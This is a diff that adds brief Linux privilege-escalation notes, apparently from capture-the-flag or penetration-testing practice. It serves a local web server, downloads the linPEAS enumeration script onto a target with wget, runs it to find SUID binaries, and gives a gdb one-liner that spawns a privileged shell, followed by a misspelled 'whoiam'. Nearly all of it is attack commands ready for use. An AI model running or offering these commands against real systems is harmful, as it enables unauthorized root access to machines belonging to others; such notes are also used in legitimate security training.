@@ -1,0 +1,25 @@
+
+
+
+# create a local server 
+python3 -m http.server 8080
+
+# Download the shell to tagrget
+wget http://localserver:port/linpeas.sh
+
+
+
+# run and save
+./linpeas.sh | tee report.txt
+
+# find 
+ (Files with Interesting Permissions)
+ [SUID]
+ 
+ 
+ # next command 
+ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+ 
+ whoiam
+
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
